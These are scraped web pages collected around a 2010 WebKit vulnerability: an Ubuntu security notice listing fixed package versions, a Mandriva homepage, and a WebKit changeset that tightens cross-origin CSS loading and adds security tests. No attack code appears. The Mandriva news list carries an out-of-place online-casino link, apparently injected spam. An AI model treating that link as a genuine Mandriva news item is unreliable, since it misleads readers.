=== Content from www.ubuntu.com_0c7677ba_20250125_142604.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-1006-1: WebKit vulnerabilities

19 October 2010

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 10.10](/security/notices?release=maverick)
* [Ubuntu 10.04](/security/notices?release=lucid)
* [Ubuntu 9.10](/security/notices?release=karmic)

## Packages

* [webkit](/security/cves?package=webkit) -

## Details

A large number of security issues were discovered in the WebKit browser and

JavaScript engines. If a user were tricked into viewing a malicious

website, a remote attacker could exploit a variety of issues related to web

browser security, including cross-site scripting attacks, denial of

service attacks, and arbitrary code execution.

Please consult the bug listed at the top of this advisory to get the exact

list of CVE numbers fixed for each release.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 9.10

* [libwebkit-1.0-2](https://launchpad.net/ubuntu/%2Bsource/webkit)
  -
  [1.2.5-0ubuntu0.9.10.1](https://launchpad.net/ubuntu/%2Bsource/webkit/1.2.5-0ubuntu0.9.10.1)

##### Ubuntu 10.10

* [libwebkit-1.0-2](https://launchpad.net/ubuntu/%2Bsource/webkit)
  -
  [1.2.5-0ubuntu0.10.10.1](https://launchpad.net/ubuntu/%2Bsource/webkit/1.2.5-0ubuntu0.10.10.1)

##### Ubuntu 10.04

* [libwebkit-1.0-2](https://launchpad.net/ubuntu/%2Bsource/webkit)
  -
  [1.2.5-0ubuntu0.10.04.1](https://launchpad.net/ubuntu/%2Bsource/webkit/1.2.5-0ubuntu0.10.04.1)

After a standard system update you need to restart any applications that

use WebKit, such as Epiphany and Midori, to make all the necessary changes.

## References

* <https://launchpad.net/bugs/660075>

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from www.mandriva.com_a2a34481_20250125_142602.html ===


* [Tuxedo.org](https://tuxedo.org/ "Go to: Tuxedo")
* Store
* Mandriva Linux
* Enterprise Solutions
* Contact Us
* Language ![](/sites/all/themes/mandriva_customer/images/arrow-grey-bottom.gif)
  + English (International)
  + Français
  + Ð ÑÑÑÐºÐ¸Ð¹

# [Mandriva](/mandriva/)

* Download
* Mandriva Linux
* Community
* Help

## One

### The Linux desktopthat's easy to try and easy to keep

Download
![Mandriva One](/sites/all/themes/mandriva_customer/images/front/packshot_Mandriva_One.png)

## Powerpack

### Mandriva Linux- and more

Download
![Mandriva Linux Powerpack](/sites/all/themes/mandriva_customer/images/front/en-49.png)

## Mandriva Flash

### The mobile and installable Linux desktopon a USB key

Buy on Store
![Mandriva Flash](/sites/all/themes/mandriva_customer/images/front/mandriva-flash2.png)

### [Community](community)

* User Forums
* Support - FAQ
* Free Software
* Become a member

### Enterprise Solutions

* Enterprise Linux Products
* Asset Management Solution
* Professional Services
* Support & Maintenance

* Go to site »

### Mandriva Partners

* Worldwide offices
* Partner Program
* Technology Partners
* OEM
* Classmate PC with Mandriva Linux

### News

* Mandriva presents the launch of its new mobile desktop: Mandriva Flash 2008 Spring
* Speaking about Mandriva Linux 2008 Spring in media
* Speaking about Mandriva Linux 2008 Spring in media
* Mandriva presents its latest distribution: Mandriva Linux 2008 Spring
* Mandriva and Novatice Technologies present Edutice, The ready to use solution dedicated to educationand multimedia spaces
* # [Top 50 Online Casinos UK in 2023](https://montycasinos.com/online-casinos/)

more

* Download
  + Mandriva Linux 2008
  + Writing an ISO image
* Mandriva Linux
  + One
  + Powerpack
  + Mandriva Flash
* Community
  + Start
  + Register
  + Stay informed
  + Participate
  + Free software
* Help
  + Getting help
  + Knowledge Base
  + Documentation
  + Forums
  + Support Requests
  + Customer Care
  + Enterprise Support
* Enterprise Solutions
  + Products
  + Support
  + Services
  + Partners
  + Go to site »

Language
English (International)
Français
Ð ÑÑÑÐºÐ¸Ð¹

* © 2007 Mandriva S.A.
* About Us
* Legal Information
* Privacy Policy
* Contact Us



=== Content from trac.webkit.org_b2027d71_20250125_142600.html ===


[![WebKit Trac](/chrome/site/favicon.png)](http://www.webkit.org/)

Search:

* [Login](/login)
* [Preferences](/prefs)
* [Forgot your password?](/reset_password)

* [Wiki](/wiki)
* [Timeline](/timeline)
* [Browse Source](/browser)
* [Search](/search)

## Context Navigation

* ← [Previous Changeset](/changeset/52783/webkit "Changeset 52783")
* [Next Changeset](/changeset/52785/webkit "Changeset 52785") →

---

# Changeset 52784 in webkit

View differences
inline
side by side

Show
lines around each change

Show the changes in full context

Ignore:

Blank lines

Case changes

White space changes

Timestamp:
Jan 4, 2010, 9:19:56 PM
([15 years](/timeline?from=2010-01-04T21%3A19%3A56-08%3A00&precision=second "See timeline at Jan 4, 2010, 9:19:56 PM") ago)
Author:
abarth@webkit.org
Message:

2010-01-04 Chris Evans <​cevans@chromium.org>

> Reviewed by Adam Barth.

> Test for [​https://bugs.webkit.org/show\_bug.cgi?id=29820](https://bugs.webkit.org/show_bug.cgi?id=29820)
>
> Adopt a more conservative approach for loading CSS cross-origin.

* http/tests/security/cross-origin-css.html: Added.
* http/tests/security/cross-origin-css-expected.txt: Added.
* http/tests/security/cross-origin-css-in-xml.xml: Added.
* http/tests/security/cross-origin-css-in-xml-expected.txt: Added.
* http/tests/security/resources/xorigincss1.css: Added.
* http/tests/security/resources/xorigincss2.css: Added.
* http/tests/security/resources/xorigincss1.html: Added.
* http/tests/security/resources/xorigincss2.html: Added.
* http/tests/security/resources/xorigincss3.html: Added.
* http/tests/security/resources/xorigincss4.html: Added.
* http/tests/security/resources/xorigincss5.html: Added.
* http/tests/security/resources/xorigincss6.html: Added.

2010-01-04 Chris Evans <​cevans@chromium.org>

> Reviewed by Adam Barth.

> Adopt a more conservative approach for loading CSS cross-origin. When
>
> loading CSS cross-origin, it must be start with valid CSS if the MIME
>
> type is broken.

> [​https://bugs.webkit.org/show\_bug.cgi?id=29820](https://bugs.webkit.org/show_bug.cgi?id=29820)

> Test: http/tests/security/cross-origin-css.html
>
> Test: http/tests/security/cross-origin-css-in-xml.xml

* html/HTMLLinkElement.cpp:
  (WebCore::HTMLLinkElement::setCSSStyleSheet): Enforce stricter load
  requirements for cross-origin loads.
* css/CSSImportRule.cpp:
  (WebCore::CSSImportRule::setCSSStyleSheet): Enforce stricter load
  requirements for cross-origin loads.
* css/CSSStyleSheet.h:
* css/CSSStyleSheet.cpp:
* css/CSSParser.cpp:
* css/CSSGrammar.y:
* css/CSSParser.h:
  Add ability to tell whether the CSS parse started with a syntactically
  valid CSS rule.
* loader/CachedCSSStyleSheet.h:
* loader/CachedCSSStyleSheet.cpp:
  (WebCore::CachedCSSStyleSheet::sheetText): Add ability to return
  whether the MIME type was acceptable for CSS.
  (WebCore::CachedCSSStyleSheet::canUseSheet): If requested, return
  whether the MIME type was valid or not.
* dom/ProcessingInstruction.cpp
  (WebCore::ProcessingInstruction::setCSSStyleSheet): Make use of strict
  mode explicit and add comment.

Location:
[trunk](/browser/webkit/trunk?rev=52784)
Files:

12 added
12 edited

* [LayoutTests/ChangeLog](/browser/webkit/trunk/LayoutTests/ChangeLog?rev=52784 "Show entry in browser")
  (modified)
  ([1 diff](#file0 "Show differences"))
* [LayoutTests/http/tests/security/cross-origin-css-expected.txt](/browser/webkit/trunk/LayoutTests/http/tests/security/cross-origin-css-expected.txt?rev=52784 "Show entry in browser")
  (added)
* [LayoutTests/http/tests/security/cross-origin-css-in-xml-expected.txt](/browser/webkit/trunk/LayoutTests/http/tests/security/cross-origin-css-in-xml-expected.txt?rev=52784 "Show entry in browser")
  (added)
* [LayoutTests/http/tests/security/cross-origin-css-in-xml.xml](/browser/webkit/trunk/LayoutTests/http/tests/security/cross-origin-css-in-xml.xml?rev=52784 "Show entry in browser")
  (added)
* [LayoutTests/http/tests/security/cross-origin-css.html](/browser/webkit/trunk/LayoutTests/http/tests/security/cross-origin-css.html?rev=52784 "Show entry in browser")
  (added)
* [LayoutTests/http/tests/security/resources/xorigincss1.css](/browser/webkit/trunk/LayoutTests/http/tests/security/resources/xorigincss1.css?rev=52784 "Show entry in browser")
  (added)
* [LayoutTests/http/tests/security/resources/xorigincss1.html](/browser/webkit/trunk/LayoutTests/http/tests/security/resources/xorigincss1.html?rev=52784 "Show entry in browser")
  (added)
* [LayoutTests/http/tests/security/resources/xorigincss2.css](/browser/webkit/trunk/LayoutTests/http/tests/security/resources/xorigincss2.css?rev=52784 "Show entry in browser")
  (added)
* [LayoutTests/http/tests/security/resources/xorigincss2.html](/browser/webkit/trunk/LayoutTests/http/tests/security/resources/xorigincss2.html?rev=52784 "Show entry in browser")
  (added)
* [LayoutTests/http/tests/security/resources/xorigincss3.html](/browser/webkit/trunk/LayoutTests/http/tests/security/resources/xorigincss3.html?rev=52784 "Show entry in browser")
  (added)
* [LayoutTests/http/tests/security/resources/xorigincss4.html](/browser/webkit/trunk/LayoutTests/http/tests/security/resources/xorigincss4.html?rev=52784 "Show entry in browser")
  (added)
* [LayoutTests/http/tests/security/resources/xorigincss5.html](/browser/webkit/trunk/LayoutTests/http/tests/security/resources/xorigincss5.html?rev=52784 "Show entry in browser")
  (added)
* [LayoutTests/http/tests/security/resources/xorigincss6.html](/browser/webkit/trunk/LayoutTests/http/tests/security/resources/xorigincss6.html?rev=52784 "Show entry in browser")
  (added)
* [WebCore/ChangeLog](/browser/webkit/trunk/WebCore/ChangeLog?rev=52784 "Show entry in browser")
  (modified)
  ([1 diff](#file13 "Show differences"))
* [WebCore/css/CSSGrammar.y](/browser/webkit/trunk/WebCore/css/CSSGrammar.y?rev=52784 "Show entry in browser")
  (modified)
  ([2 diffs](#file14 "Show differences"))
* [WebCore/css/CSSImportRule.cpp](/browser/webkit/trunk/WebCore/css/CSSImportRule.cpp?rev=52784 "Show entry in browser")
  (modified)
  ([3 diffs](#file15 "Show differences"))
* [WebCore/css/CSSParser.cpp](/browser/webkit/trunk/WebCore/css/CSSParser.cpp?rev=52784 "Show entry in browser")
  (modified)
  ([2 diffs](#file16 "Show differences"))
* [WebCore/css/CSSParser.h](/browser/webkit/trunk/WebCore/css/CSSParser.h?rev=52784 "Show entry in browser")
  (modified)
  ([2 diffs](#file17 "Show differences"))
* [WebCore/css/CSSStyleSheet.cpp](/browser/webkit/trunk/WebCore/css/CSSStyleSheet.cpp?rev=52784 "Show entry in browser")
  (modified)
  ([3 diffs](#file18 "Show differences"))
* [WebCore/css/CSSStyleSheet.h](/browser/webkit/trunk/WebCore/css/CSSStyleSheet.h?rev=52784 "Show entry in browser")
  (modified)
  ([2 diffs](#file19 "Show differences"))
* [WebCore/dom/ProcessingInstruction.cpp](/browser/webkit/trunk/WebCore/dom/ProcessingInstruction.cpp?rev=52784 "Show entry in browser")
  (modified)
  ([1 diff](#file20 "Show differences"))
* [WebCore/html/HTMLLinkElement.cpp](/browser/webkit/trunk/WebCore/html/HTMLLinkElement.cpp?rev=52784 "Show entry in browser")
  (modified)
  ([2 diffs](#file21 "Show differences"))
* [WebCore/loader/CachedCSSStyleSheet.cpp](/browser/webkit/trunk/WebCore/loader/CachedCSSStyleSheet.cpp?rev=52784 "Show entry in browser")
  (modified)
  ([3 diffs](#file22 "Show differences"))
* [WebCore/loader/CachedCSSStyleSheet.h](/browser/webkit/trunk/WebCore/loader/CachedCSSStyleSheet.h?rev=52784 "Show entry in browser")
  (modified)
  ([2 diffs](#file23 "Show differences"))

### Legend:

Unmodified
Added
Removed

* ## [trunk/LayoutTests/ChangeLog](/changeset/52784/webkit/trunk/LayoutTests/ChangeLog "Show the changeset 52784 restricted to trunk/LayoutTests/ChangeLog")

  | [r52783](/browser/webkit/trunk/LayoutTests/ChangeLog?rev=52783#L1 "Show revision 52783 of this file in browser") | [r52784](/browser/webkit/trunk/LayoutTests/ChangeLog?rev=52784#L1 "Show revision 52784 of this file in browser") |  |
  | --- | --- | --- |
  |  | 1 | 2010-01-04  Chris Evans  <cevans@chromium.org> |
  |  | 2 |  |
  |  | 3 | Reviewed by Adam Barth. |
  |  | 4 |  |
  |  | 5 | Test for https://bugs.webkit.org/show\_bug.cgi?id=29820 |
  |  | 6 | Adopt a more conservative approach for loading CSS cross-origin. |
  |  | 7 |  |
  |  | 8 | \* http/tests/security/cross-origin-css.html: Added. |
  |  | 9 | \* http/tests/security/cross-origin-css-expected.txt: Added. |
  |  | 10 | \* http/tests/security/cross-origin-css-in-xml.xml: Added. |
  |  | 11 | \* http/tests/security/cross-origin-css-in-xml-expected.txt: Added. |
  |  | 12 | \* http/tests/security/resources/xorigincss1.css: Added. |
  |  | 13 | \* http/tests/security/resources/xorigincss2.css: Added. |
  |  | 14 | \* http/tests/security/resources/xorigincss1.html: Added. |
  |  | 15 | \* http/tests/security/resources/xorigincss2.html: Added. |
  |  | 16 | \* http/tests/security/resources/xorigincss3.html: Added. |
  |  | 17 | \* http/tests/security/resources/xorigincss4.html: Added. |
  |  | 18 | \* http/tests/security/resources/xorigincss5.html: Added. |
  |  | 19 | \* http/tests/security/resources/xorigincss6.html: Added. |
  |  | 20 |  |
  | 1 | 21 | 2010-01-04  Dan Bernstein  <mitz@apple.com> |
  | 2 | 22 |  |
* ## [trunk/WebCore/ChangeLog](/changeset/52784/webkit/trunk/WebCore/ChangeLog "Show the changeset 52784 restricted to trunk/WebCore/ChangeLog")

  | [r52783](/browser/webkit/trunk/WebCore/ChangeLog?rev=52783#L1 "Show revision 52783 of this file in browser") | [r52784](/browser/webkit/trunk/WebCore/ChangeLog?rev=52784#L1 "Show revision 52784 of this file in browser") |  |
  | --- | --- | --- |
  |  | 1 | 2010-01-04  Chris Evans  <cevans@chromium.org> |
  |  | 2 |  |
  |  | 3 | Reviewed by Adam Barth. |
  |  | 4 |  |
  |  | 5 | Adopt a more conservative approach for loading CSS cross-origin. When |
  |  | 6 | loading CSS cross-origin, it must be start with valid CSS if the MIME |
  |  | 7 | type is broken. |
  |  | 8 |  |
  |  | 9 | https://bugs.webkit.org/show\_bug.cgi?id=29820 |
  |  | 10 |  |
  |  | 11 | Test: http/tests/security/cross-origin-css.html |
  |  | 12 | Test: http/tests/security/cross-origin-css-in-xml.xml |
  |  | 13 |  |
  |  | 14 | \* html/HTMLLinkElement.cpp: |
  |  | 15 | (WebCore::HTMLLinkElement::setCSSStyleSheet): Enforce stricter load |
  |  | 16 | requirements for cross-origin loads. |
  |  | 17 | \* css/CSSImportRule.cpp: |
  |  | 18 | (WebCore::CSSImportRule::setCSSStyleSheet): Enforce stricter load |
  |  | 19 | requirements for cross-origin loads. |
  |  | 20 | \* css/CSSStyleSheet.h: |
  |  | 21 | \* css/CSSStyleSheet.cpp: |
  |  | 22 | \* css/CSSParser.cpp: |
  |  | 23 | \* css/CSSGrammar.y: |
  |  | 24 | \* css/CSSParser.h: |
  |  | 25 | Add ability to tell whether the CSS parse started with a syntactically |
  |  | 26 | valid CSS rule. |
  |  | 27 | \* loader/CachedCSSStyleSheet.h: |
  |  | 28 | \* loader/CachedCSSStyleSheet.cpp: |
  |  | 29 | (WebCore::CachedCSSStyleSheet::sheetText): Add ability to return |
  |  | 30 | whether the MIME type was acceptable for CSS. |
  |  | 31 | (WebCore::CachedCSSStyleSheet::canUseSheet): If requested, return |
  |  | 32 | whether the MIME type was valid or not. |
  |  | 33 | \* dom/ProcessingInstruction.cpp |
  |  | 34 | (WebCore::ProcessingInstruction::setCSSStyleSheet): Make use of strict |
  |  | 35 | mode explicit and add comment. |
  |  | 36 |  |
  | 1 | 37 | 2010-01-04  Dan Bernstein  <mitz@apple.com> |
  | 2 | 38 |  |
* ## [trunk/WebCore/css/CSSGrammar.y](/changeset/52784/webkit/trunk/WebCore/css/CSSGrammar.y "Show the changeset 52784 restricted to trunk/WebCore/css/CSSGrammar.y")

  | [r51608](/browser/webkit/trunk/WebCore/css/CSSGrammar.y?rev=51608#L387 "Show revision 51608 of this file in browser") | [r52784](/browser/webkit/trunk/WebCore/css/CSSGrammar.y?rev=52784#L387 "Show revision 52784 of this file in browser") |  |
  | --- | --- | --- |
  | 387 | 387 |  |
  | 388 | 388 | rule: |
  | 389 |  | valid\_rule |
  |  | 389 | valid\_rule { |
  |  | 390 | static\_cast<CSSParser\*>(parser)->m\_hadSyntacticallyValidCSSRule = true; |
  |  | 391 | } |
  | 390 | 392 | | invalid\_rule |
  | 391 | 393 | | invalid\_at |
  | […](/browser/webkit/trunk/WebCore/css/CSSGrammar.y?rev=51608#L1478) | […](/browser/webkit/trunk/WebCore/css/CSSGrammar.y?rev=52784#L1480) |  |
  | 1478 | 1480 |  |
  | 1479 | 1481 | invalid\_block: |
  | 1480 |  | '{' error invalid\_block\_list error closing\_brace |
  | 1481 |  | | '{' error closing\_brace |
  |  | 1482 | '{' error invalid\_block\_list error closing\_brace { |
  |  | 1483 | static\_cast<CSSParser\*>(parser)->invalidBlockHit(); |
  |  | 1484 | } |
  |  | 1485 | | '{' error closing\_brace { |
  |  | 1486 | static\_cast<CSSParser\*>(parser)->invalidBlockHit(); |
  |  | 1487 | } |
  | 1482 | 1488 | ; |
  | 1483 | 1489 |  |
* ## [trunk/WebCore/css/CSSImportRule.cpp](/changeset/52784/webkit/trunk/WebCore/css/CSSImportRule.cpp "Show the changeset 52784 restricted to trunk/WebCore/css/CSSImportRule.cpp")

  | [r52032](/browser/webkit/trunk/WebCore/css/CSSImportRule.cpp?rev=52032#L26 "Show revision 52032 of this file in browser") | [r52784](/browser/webkit/trunk/WebCore/css/CSSImportRule.cpp?rev=52784#L26 "Show revision 52784 of this file in browser") |  |
  | --- | --- | --- |
  | 26 | 26 | #include "DocLoader.h" |
  | 27 | 27 | #include "Document.h" |
  |  | 28 | #include "SecurityOrigin.h" |
  | 28 | 29 | #include "Settings.h" |
  | 29 | 30 | #include <wtf/StdLibExtras.h> |
  | […](/browser/webkit/trunk/WebCore/css/CSSImportRule.cpp?rev=52032#L60) | […](/browser/webkit/trunk/WebCore/css/CSSImportRule.cpp?rev=52784#L61) |  |
  | 60 | 61 | m\_styleSheet = CSSStyleSheet::create(this, url, charset); |
  | 61 | 62 |  |
  |  | 63 | bool crossOriginCSS = false; |
  |  | 64 | bool validMIMEType = false; |
  | 62 | 65 | CSSStyleSheet\* parent = parentStyleSheet(); |
  | 63 | 66 | bool strict = !parent || parent->useStrictParsing(); |
  | […](/browser/webkit/trunk/WebCore/css/CSSImportRule.cpp?rev=52032#L73) | […](/browser/webkit/trunk/WebCore/css/CSSImportRule.cpp?rev=52784#L76) |  |
  | 73 | 76 | #endif |
  | 74 | 77 |  |
  | 75 |  | String sheetText = sheet->sheetText(enforceMIMEType); |
  |  | 78 | String sheetText = sheet->sheetText(enforceMIMEType, &validMIMEType); |
  | 76 | 79 | m\_styleSheet->parseString(sheetText, strict); |
  |  | 80 |  |
  |  | 81 | if (!parent || !parent->doc() || !parent->doc()->securityOrigin()->canRequest(KURL(ParsedURLString, url))) |
  |  | 82 | crossOriginCSS = true; |
  |  | 83 |  |
  |  | 84 | if (crossOriginCSS && !validMIMEType && !m\_styleSheet->hasSyntacticallyValidCSSHeader()) |
  |  | 85 | m\_styleSheet = CSSStyleSheet::create(this, url, charset); |
  | 77 | 86 |  |
  | 78 | 87 | if (strict && needsSiteSpecificQuirks) { |
* ## [trunk/WebCore/css/CSSParser.cpp](/changeset/52784/webkit/trunk/WebCore/css/CSSParser.cpp "Show the changeset 52784 restricted to trunk/WebCore/css/CSSParser.cpp")

  | [r51727](/browser/webkit/trunk/WebCore/css/CSSParser.cpp?rev=51727#L140 "Show revision 51727 of this file in browser") | [r52784](/browser/webkit/trunk/WebCore/css/CSSParser.cpp?rev=52784#L140 "Show revision 52784 of this file in browser") |  |
  | --- | --- | --- |
  | 140 | 140 | , m\_implicitShorthand(false) |
  | 141 | 141 | , m\_hasFontFaceOnlyValues(false) |
  |  | 142 | , m\_hadSyntacticallyValidCSSRule(false) |
  | 142 | 143 | , m\_defaultNamespace(starAtom) |
  | 143 | 144 | , m\_data(0) |
  | […](/browser/webkit/trunk/WebCore/css/CSSParser.cpp?rev=51727#L5234) | […](/browser/webkit/trunk/WebCore/css/CSSParser.cpp?rev=52784#L5235) |  |
  | 5234 | 5235 | } |
  | 5235 | 5236 |  |
  |  | 5237 | void CSSParser::invalidBlockHit() |
  |  | 5238 | { |
  |  | 5239 | if (m\_styleSheet && !m\_hadSyntacticallyValidCSSRule) |
  |  | 5240 | m\_styleSheet->setHasSyntacticallyValidCSSHeader(false); |
  |  | 5241 | } |
  |  | 5242 |  |
  | 5236 | 5243 | static int cssPropertyID(const UChar\* propertyName, unsigned length) |
  | 5237 | 5244 | { |
* ## [trunk/WebCore/css/CSSParser.h](/changeset/52784/webkit/trunk/WebCore/css/CSSParser.h "Show the changeset 52784 restricted to trunk/WebCore/css/CSSParser.h")

  | [r51608](/browser/webkit/trunk/WebCore/css/CSSParser.h?rev=51608#L194 "Show revision 51608 of this file in browser") | [r52784](/browser/webkit/trunk/WebCore/css/CSSParser.h?rev=52784#L194 "Show revision 52784 of this file in browser") |  |
  | --- | --- | --- |
  | 194 | 194 | bool checkForVariables(CSSParserValueList\*); |
  | 195 | 195 | void addUnresolvedProperty(int propId, bool important); |
  |  | 196 | void invalidBlockHit(); |
  | 196 | 197 |  |
  | 197 | 198 | Vector<CSSSelector\*>\* reusableSelectorVector() { return &m\_reusableSelectorVector; } |
  | […](/browser/webkit/trunk/WebCore/css/CSSParser.h?rev=51608#L215) | […](/browser/webkit/trunk/WebCore/css/CSSParser.h?rev=52784#L216) |  |
  | 215 | 216 |  |
  | 216 | 217 | bool m\_hasFontFaceOnlyValues; |
  |  | 218 | bool m\_hadSyntacticallyValidCSSRule; |
  | 217 | 219 |  |
  | 218 | 220 | Vector<String> m\_variableNames; |
* ## [trunk/WebCore/css/CSSStyleSheet.cpp](/changeset/52784/webkit/trunk/WebCore/css/CSSStyleSheet.cpp "Show the changeset 52784 restricted to trunk/WebCore/css/CSSStyleSheet.cpp")

  | [r51556](/browser/webkit/trunk/WebCore/css/CSSStyleSheet.cpp?rev=51556#L43 "Show revision 51556 of this file in browser") | [r52784](/browser/webkit/trunk/WebCore/css/CSSStyleSheet.cpp?rev=52784#L43 "Show revision 52784 of this file in browser") |  |
  | --- | --- | --- |
  | 43 | 43 | , m\_strictParsing(!parentSheet || parentSheet->useStrictParsing()) |
  | 44 | 44 | , m\_isUserStyleSheet(parentSheet ? parentSheet->isUserStyleSheet() : false) |
  |  | 45 | , m\_hasSyntacticallyValidCSSHeader(true) |
  | 45 | 46 | { |
  | 46 | 47 | } |
  | […](/browser/webkit/trunk/WebCore/css/CSSStyleSheet.cpp?rev=51556#L54) | […](/browser/webkit/trunk/WebCore/css/CSSStyleSheet.cpp?rev=52784#L55) |  |
  | 54 | 55 | , m\_strictParsing(false) |
  | 55 | 56 | , m\_isUserStyleSheet(false) |
  |  | 57 | , m\_hasSyntacticallyValidCSSHeader(true) |
  | 56 | 58 | { |
  | 57 | 59 | } |
  | […](/browser/webkit/trunk/WebCore/css/CSSStyleSheet.cpp?rev=51556#L63) | […](/browser/webkit/trunk/WebCore/css/CSSStyleSheet.cpp?rev=52784#L65) |  |
  | 63 | 65 | , m\_loadCompleted(false) |
  | 64 | 66 | , m\_strictParsing(!ownerRule || ownerRule->useStrictParsing()) |
  |  | 67 | , m\_hasSyntacticallyValidCSSHeader(true) |
  | 65 | 68 | { |
  | 66 | 69 | CSSStyleSheet\* parentSheet = ownerRule ? ownerRule->parentStyleSheet() : 0; |
* ## [trunk/WebCore/css/CSSStyleSheet.h](/changeset/52784/webkit/trunk/WebCore/css/CSSStyleSheet.h "Show the changeset 52784 restricted to trunk/WebCore/css/CSSStyleSheet.h")

  | [r48773](/browser/webkit/trunk/WebCore/css/CSSStyleSheet.h?rev=48773#L96 "Show revision 48773 of this file in browser") | [r52784](/browser/webkit/trunk/WebCore/css/CSSStyleSheet.h?rev=52784#L96 "Show revision 52784 of this file in browser") |  |
  | --- | --- | --- |
